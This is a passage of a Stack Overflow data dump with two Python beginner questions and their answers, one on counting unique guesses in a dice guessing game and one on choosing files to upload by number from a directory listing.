"user_type": "registered", "profile_image": "https://i.stack.imgur.com/J9b63.png?s=128&g=1", "display_name": "Alexey Gorozhanov", "link": "https://stackoverflow.com/users/1921715/alexey-gorozhanov"}, "is_accepted": false, "score": 1, "last_activity_date": 1427914547, "last_edit_date": 1427914547, "creation_date": 1427912790, "answer_id": 29398100, "question_id": 29397736, "link": "https://stackoverflow.com/questions/29397736/python-guessing-game-counting-number-of-guesses/29398100#29398100", "title": "Python guessing game, counting number of guesses", "body": "<p>I would suggest to use a list to append guesses. I changed your code this way (for Python 3 in my case):</p>\n\n<pre><code>import random\n\ngive_number = int(input(\"We will roll a 6 sided dice. What do you think the number will be?\\n \"))\nguess_number = 1\nguessList = []\nguessList.append(give_number)\n\ndice = random.randint(1,6)\nwhile give_number != dice:\n    if give_number &gt; dice:\n        give_number = int(input(\"Sorry, that answer is too high! Try again!\\n \"))\n        #guess_number = guess_number + 1\n        if give_number not in guessList:\n            guessList.append(give_number)\n    if give_number &lt; dice:\n        give_number = int(input(\"Sorry, that answer is too low! Try again!\\n \"))\n        #guess_number = guess_number + 1\n        if give_number not in guessList:\n            guessList.append(give_number)\n\nif give_number not in guessList:\n    guessList.append(give_number)\nprint (\"Congratulations, you were right, the answer was {}! It took you {} tries.\".format(dice, len(guessList)))\n</code></pre>\n\n<p>If you want to check if the input is an integer or within your range, you can have a look at this code:</p>\n\n<pre><code>import random\n\ndef inputIsInt(inpStr): # checks if the input is an integer in range (1, 7).\n    try:\n        if int(inpStr) in range(1, 7):\n            return True\n        else:\n            return False\n    except ValueError:\n        return False\n\ngive_number = input(\"We will roll a 6 sided dice. What do you think the number will be?\\n \")\nwhile not inputIsInt(give_number):\n    print(\"Sorry, your input is not an integer or out of range\")\n    give_number = input(\"We will roll a 6 sided dice. What do you think the number will be?\\n \")\n\nguessList = []\nguessList.append(int(give_number))\ndice = random.randint(1,6)\n\nwhile int(give_number) != dice:\n    if int(give_number) &gt; dice:\n        give_number = input(\"Sorry, that answer is too high! Try again!\\n \")\n        while not inputIsInt(give_number):\n            print(\"Sorry, your input is not an integer or out of range\")\n            give_number = input(\"We will roll a 6 sided dice. What do you think the number will be?\\n \")\n        if int(give_number) not in guessList:\n            guessList.append(int(give_number))\n    if int(give_number) &lt; dice:\n        give_number = input(\"Sorry, that answer is too low! Try again!\\n \")\n        while not inputIsInt(give_number):\n            print(\"Sorry, your input is not an integer or out of range\")\n            give_number = input(\"We will roll a 6 sided dice. What do you think the number will be?\\n \")\n        if int(give_number) not in guessList:\n            guessList.append(int(give_number))\n\nif int(give_number) not in guessList:\n    guessList.append(int(give_number))\nprint (\"Congratulations, you were right, the answer was {}! It took you {} tries.\".format(dice, len(guessList)))\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1082, "user_id": 4218896, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/467d0f21ceaf1cc47ed8d84f94e89b77?s=128&d=identicon&r=PG&f=1", "display_name": "jfish003", "link": "https://stackoverflow.com/users/4218896/jfish003"}, "is_accepted": false, "score": 0, "last_activity_date": 1427913699, "creation_date": 1427913699, "answer_id": 29398370, "question_id": 29397736, "link": "https://stackoverflow.com/questions/29397736/python-guessing-game-counting-number-of-guesses/29398370#29398370", "title": "Python guessing game, counting number of guesses", "body": "<p>You also could move the guess_number variable outside of the if statement so:</p>\n\n<pre><code>    import random\n\n    give_number = input(\"We will roll a 6 sided dice. What do you think the number will be?\\n \")\n    guess_number = 0\n\n    dice = random.randint(1,6)\n    while give_number != dice:\n        guess_number = guess_number + 1\n        if give_number &gt; dice:\n            give_number = input(\"Sorry, that answer is too high! Try again!\\n \")\n            #guess_number = guess_number +1\n        if give_number &lt; dice:\n            give_number = input(\"Sorry, that answer is too low! Try again!\\n \")\n            #guess_number = guess_number +1\n\n    print \"Congratulations, you were right, the answer was {}! It took you {} tries.\".format(dice,guess_number)\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 4739413, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4b23e432bc8290e6f6863dabb46b52cd?s=128&d=identicon&r=PG&f=1", "display_name": "Lindsay Swanson", "link": "https://stackoverflow.com/users/4739413/lindsay-swanson"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 9902, "favorite_count": 2, "answer_count": 3, "score": 1, "last_activity_date": 1427914547, "creation_date": 1427911548, "last_edit_date": 1427914379, "question_id": 29397736, "link": "https://stackoverflow.com/questions/29397736/python-guessing-game-counting-number-of-guesses", "title": "Python guessing game, counting number of guesses", "body": "<p>My Intro to Computer Science teacher gave us a dice guessing game challenge, and while I've managed to figure out most of the components, the final piece is to return what the correct number is (once they've guessed it) and the number of tries it took for them to figure it out. My code returns all of that, but it doesn't account for if the person guessing guesses the same number twice. Is there a way to tell them how many guesses it took for them to find a number while disregarding any repeated numbers?</p>\n\n<p>This is the code that I have so far:</p>\n\n<pre><code>import random\n\ngive_number = input(\"We will roll a 6 sided dice. What do you think the number will be?\\n \")\nguess_number = 1\n\ndice = random.randint(1,6)\nwhile give_number != dice:\n    if give_number &gt; dice:\n        give_number = input(\"Sorry, that answer is too high! Try again!\\n \")\n        guess_number = guess_number +1\n    if give_number &lt; dice:\n        give_number = input(\"Sorry, that answer is too low! Try again!\\n \")\n        guess_number = guess_number +1\n\nprint \"Congratulations, you were right, the answer was {}! It took you {} tries.\".format(dice, guess_number)\n</code></pre>\n"}, {"tags": ["python"], "comments": [{"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1427911758, "post_id": 29397725, "comment_id": 46971598, "body": "what is the relation between number and file?"}, {"owner": {"reputation": 1157, "user_id": 3533979, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/s9Bgz.jpg?s=128&g=1", "display_name": "UserX", "link": "https://stackoverflow.com/users/3533979/userx"}, "reply_to_user": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1427912020, "post_id": 29397725, "comment_id": 46971771, "body": "Im showing all the filenames associated with a number, and Im asking user to write the number that appears next to the filename. So there isnt a relation between number and file. But Im trying to create that relation, What I thought was, save a dictonary with key (number that appears next to the filename) and value (the filename)"}], "answers": [{"comments": [{"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1427912924, "post_id": 29397930, "comment_id": 46972240, "body": "don&#39;t use .keys just use  <code>in files_dict</code>"}, {"owner": {"reputation": 1157, "user_id": 3533979, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/s9Bgz.jpg?s=128&g=1", "display_name": "UserX", "link": "https://stackoverflow.com/users/3533979/userx"}, "edited": false, "score": 0, "creation_date": 1427913025, "post_id": 29397930, "comment_id": 46972271, "body": "Thanks for trying to help. I have upload(file_name_number) after show the message &quot;The selected number does not exist in current directory&quot; to ask again user to write the file number if we writes a number that does not exist.   And Im trying to do as you said, but when I use the dictonary when I call upload() method I get always error that files_dict is not defined."}, {"owner": {"reputation": 1157, "user_id": 3533979, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/s9Bgz.jpg?s=128&g=1", "display_name": "UserX", "link": "https://stackoverflow.com/users/3533979/userx"}, "edited": false, "score": 0, "creation_date": 1427915126, "post_id": 29397930, "comment_id": 46973488, "body": "Thanks for your help again, but with your solution in upload(&quot;Select the number....&quot;) lines Im always getting this: TypeError: coercing to Unicode: need string or buffer, int found"}, {"owner": {"reputation": 1157, "user_id": 3533979, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/s9Bgz.jpg?s=128&g=1", "display_name": "UserX", "link": "https://stackoverflow.com/users/3533979/userx"}, "edited": false, "score": 0, "creation_date": 1427915568, "post_id": 29397930, "comment_id": 46973718, "body": "Here:  firstFile  = upload(&quot;Select the number of first file:&quot;,files_dict)"}, {"owner": {"reputation": 1173, "user_id": 4014693, "user_type": "registered", "accept_rate": 75, "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "avinash pandey", "link": "https://stackoverflow.com/users/4014693/avinash-pandey"}, "reply_to_user": {"reputation": 1157, "user_id": 3533979, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/s9Bgz.jpg?s=128&g=1", "display_name": "UserX", "link": "https://stackoverflow.com/users/3533979/userx"}, "edited": false, "score": 0, "creation_date": 1427915956, "post_id": 29397930, "comment_id": 46973914, "body": "Let us <a href=\"http://chat.stackoverflow.com/rooms/74287/discussion-between-avinash-pandey-and-userx\">continue this discussion in chat</a>."}], "tags": [], "owner": {"reputation": 1173, "user_id": 4014693, "user_type": "registered", "accept_rate": 75, "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "avinash pandey", "link": "https://stackoverflow.com/users/4014693/avinash-pandey"}, "is_accepted": true, "score": 1, "last_activity_date": 1427915925, "last_edit_date": 1427915925, "creation_date": 1427912226, "answer_id": 29397930, "question_id": 29397725, "link": "https://stackoverflow.com/questions/29397725/upload-files-using-a-number-associated-with-each-file-instead-of-the-name-of-the/29397930#29397930", "title": "upload files using a number associated with each file instead of the name of the file", "body": "<p>You are creating a dictionary for mapping number to file name but in the upload function you are checking whether file with number exists or not which will be false as files are stored with names and not numbers.You need to check whether that number exists in dict or not.</p>\n\n<pre><code>import os\n\ndef upload(file_name_number,files_dict): \n\n    filename = int(raw_input(file_name_number))\n    #as the key to dictionary is integer\n    if filename in files_dict:\n        # upload code here\n        print \"dummy\"\n    else:\n        print \"The selected number does not exist in current directory.\"\n        upload(file_name_number,files_dict)#why are you calling this again\n    return filename\n\ndef create():\n    files_dict = showListAndSaveDict()\n    firstFile  = upload(\"Select the number of first file:\",files_dict)\n    secondFile = upload(\"Select the number of second file:\",files_dict)\n    thirdFile  = upload(\"Select the number of third file:\",files_dict)\n\ndef showListAndSaveDict():\n    files = [f for f in os.listdir('.') if os.path.isfile(f)]\n    files_dict = {}\n    i=0\n    for f in files:\n        i = i+1\n        print (str(i) + \" - \" + f)  \n        files_dict[i] = f\n    return files_dict\n\ncreate()\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 1157, "user_id": 3533979, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/s9Bgz.jpg?s=128&g=1", "display_name": "UserX", "link": "https://stackoverflow.com/users/3533979/userx"}, "edited": false, "score": 0, "creation_date": 1427915022, "post_id": 29398334, "comment_id": 46973427, "body": "Thanks for your answer. But with your solution Im always getting &quot;The selected number does not exist in current directory&quot;. Im here trying to find where the issue is!"}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "reply_to_user": {"reputation": 1157, "user_id": 3533979, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/s9Bgz.jpg?s=128&g=1", "display_name": "UserX", "link": "https://stackoverflow.com/users/3533979/userx"}, "edited": false, "score": 1, "creation_date": 1427915078, "post_id": 29398334, "comment_id": 46973461, "body": "sorry, missed a str call, should be fixed"}, {"owner": {"reputation": 1157, "user_id": 3533979, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/s9Bgz.jpg?s=128&g=1", "display_name": "UserX", "link": "https://stackoverflow.com/users/3533979/userx"}, "edited": false, "score": 0, "creation_date": 1427915941, "post_id": 29398334, "comment_id": 46973906, "body": "Thank you, it was really that the issue!  But now Im getting other error if I select the number 1 that corresponds to filename_test.py: IOError: [Errno 2] No such file or directory: &#39;1-filename_test.py&#39;"}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "reply_to_user": {"reputation": 1157, "user_id": 3533979, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/s9Bgz.jpg?s=128&g=1", "display_name": "UserX", "link": "https://stackoverflow.com/users/3533979/userx"}, "edited": false, "score": 0, "creation_date": 1427916324, "post_id": 29398334, "comment_id": 46974091, "body": "that is because you wanted to add  <code>1-</code> etc..  <code>filename_test.py</code> is the name not <code>1-filename_test.py</code>, I will edit in a minute"}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "reply_to_user": {"reputation": 1157, "user_id": 3533979, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/s9Bgz.jpg?s=128&g=1", "display_name": "UserX", "link": "https://stackoverflow.com/users/3533979/userx"}, "edited": false, "score": 0, "creation_date": 1427916705, "post_id": 29398334, "comment_id": 46974332, "body": "@UserX, had to change your logic"}], "tags": [], "owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "is_accepted": false, "score": 1, "last_activity_date": 1427916684, "last_edit_date": 1427916684, "creation_date": 1427913573, "answer_id": 29398334, "question_id": 29397725, "link": "https://stackoverflow.com/questions/29397725/upload-files-using-a-number-associated-with-each-file-instead-of-the-name-of-the/29398334#29398334", "title": "upload files using a number associated with each file instead of the name of the file", "body": "<p>You don't return anything in <code>create()</code> and you don't pass a dict therefore you won't be able to access it so you may be better off moving the logic to <code>upload</code> and forget the other functions using a  while loop to keep looping until three files are uploaded</p>\n\n<pre><code>from pprint import pprint as pp\n\ndef upload():\n    file_dict = showListAndSaveDict()\n    # kepp track of how many successful uploads\n    uploaded = 0\n    # keep list of all files uploaded\n    files_uploaded = []\n    # keep looping until three files have been successfully uploaded\n    while uploaded &lt; 3:\n        for k,v in file_dict.iteritems():\n            print(\"Number {}: file: {}\".format(k,v))\n        file_number = raw_input(\"Please choose a file number\")\n        # make sure choice is valid\n        if file_number in file_dict:\n            # do whatever\n            # increase count \n            uploaded += 1\n            files_uploaded.append(file_dict[file_number])\n        else:\n            # key was not in dict\n            print \"The selected number does not exist in current directory.\"\n    return files_uploaded\n\n\ndef showListAndSaveDict():\n    files = (f for f in os.listdir('.') if os.path.isfile(f))\n    return {str(k):\"{}-{}\".format(k,f)  for k, f in enumerate(files)}\n</code></pre>\n\n<p>I presume there is supposed to be another function that actually uploads the files which should be call in place of # do whatever</p>\n\n<p>You should always use a while loop instead of the function repeatedly calling itself.</p>\n"}], "owner": {"reputation": 1157, "user_id": 3533979, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/s9Bgz.jpg?s=128&g=1", "display_name": "UserX", "link": "https://stackoverflow.com/users/3533979/userx"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 40, "favorite_count": 0, "accepted_answer_id": 29397930, "answer_count": 2, "score": 1, "last_activity_date": 1427916684, "creation_date": 1427911523, "last_edit_date": 1427914941, "question_id": 29397725, "link": "https://stackoverflow.com/questions/29397725/upload-files-using-a-number-associated-with-each-file-instead-of-the-name-of-the", "title": "upload files using a number associated with each file instead of the name of the file", "body": "<p>Im showing the list of current files in a directory.</p>\n\n<p>And for each file Im showing a number associated, and then I want to ask user to digit 3 file, but not with file name, I want using the associated number.</p>\n\n<p>So Im storing each filename with number associated in a dictonary.</p>\n\n<p>And now Im trying to upload using the number associated to each file, but Im not having sucess doing this.</p>\n\n<p>Someone already did something like this and can give me a help?</p>\n\n<pre><code>import os \n\ndef upload(file_name_number): \n\n    filename = raw_input(file_name_number)\n\n    if(os.path.exists(filename)):\n        key.set_contents_from_filename(filename)\n    else:\n        print \"The selected number does not exist in current directory.\"\n        upload(file_name_number)\n    return filename    \n\ndef create():\n\n    showListAndSaveDict()\n\n    firstFile  = upload(\"Select the number of first file:\")\n    secondFile = upload(\"Select the number of second file:\")\n    thirdFile  = upload(\"Select the number of third file:\") \n\ndef showListAndSaveDict():\n    files = [f for f in os.listdir('.') if os.path.isfile(f)]\n    files_dict = {}\n    i=0\n    for f in files:\n        i = i+1\n        print (str(i) + \" - \" + f)  \n        files_dict[i] = f\n    return files_dict\n\ncreate()\n</code></pre>\n"}]